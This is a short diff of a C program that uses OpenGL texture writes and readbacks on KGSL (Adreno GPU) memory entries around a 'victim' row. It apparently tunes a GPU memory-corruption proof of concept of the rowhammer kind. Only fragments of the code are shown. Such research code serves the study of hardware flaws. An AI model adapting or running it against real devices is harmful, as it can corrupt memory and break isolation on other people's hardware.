@@ -588,11 +588,10 @@ int main(){
 
 		struct kgsl_entry* row2 = victim;
 		for(int j = 0; j < 16; ++j){
-			if(j < 4){
-                                glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
-                                glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
-                        }
-
+			
+			glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
+			glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
+            
 			row2 = row2->kgsl_next;
 		}
 		
@@ -779,7 +778,7 @@ int main(){
 			}
         	printf("\n");
 					glBindFramebuffer(GL_FRAMEBUFFER, FBF);	
-		for(int vic = 0; vic < 4; ++vic){	
+		for(int vic = 0; vic < 2; ++vic){	
 			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
 			glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
 			printf("READVALS: \n");
@@ -812,11 +811,10 @@ int main(){
 
 			row2 = victim;
 			for(int j = 0; j < 16; ++j){
-				if(j < 4){
-                	                glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
-        	                        glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
-	                        }
-
+				if(k == 16){
+					glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
+					glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
+				}
 				row2 = row2->kgsl_next;
 			}
 			
